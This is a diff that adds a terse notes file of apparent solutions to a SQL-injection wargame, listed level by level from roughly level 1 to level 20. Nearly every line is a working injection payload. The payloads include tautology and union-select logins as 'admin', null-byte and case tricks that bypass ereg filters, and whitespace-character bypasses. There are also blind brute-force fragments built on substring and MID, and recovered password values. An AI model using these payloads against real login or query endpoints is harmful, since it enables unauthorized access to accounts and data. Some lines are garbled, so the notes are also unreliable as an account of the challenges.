@@ -1,0 +1,39 @@
+gemini->id=0}' or 1 -- -
+
+cobolt->pw=0') union select 'admin' -- 
+
+no=2%20union%20select%20char(97,100,109,105,110)
+
+lvl4->b.f the pw filed with id='admin' 295d5844 295d5844
+
+lvl5->?pw=1%27||id=%27admin
+
+lvl6->pw=0%27||id=%27admin
+
+lvl7-->pw=6c864dec 
+
+lvl8-> id=AdMiN ;)               # if(@ereg("admin",$_GET[id])) exit("HeHe");
+
+lvl9->id=AdMiN           just replace if it found admin so put AdMiN
+
+lvl 10->0' or id='admin'-- -
+
+lvl 11->88e3137f bf script-->0 or substring(pw,"+str(i)+",1) like "+chr(j)+"-- -"
+
+level 12->1c62ba6f bf script --> 0 or MID(pw,"+str(i)+",1) like char("+str(j)+") and id like 0x61646d696e
+
+level 13-->735c2773
+
+less14->shit=%0B
+
+less 15-> 832%
+
+less 16-> ereg() stopps checking after null byte  #id=%00%27 or 1 -- -
+
+less 17 -->  id=\&pw=or 1 -- -
+
+lvl 18--->')=0;%00 (have no idea how )
+
+level 19--> (¸ùÅ°ÆÐÄ¡¤»)script xavis.py convert to hex the to unicode via https://unicode-table.com/en/search/
+
+level 20->pw=%0a%20and%20pw=1%20%20or%20id=%27admin
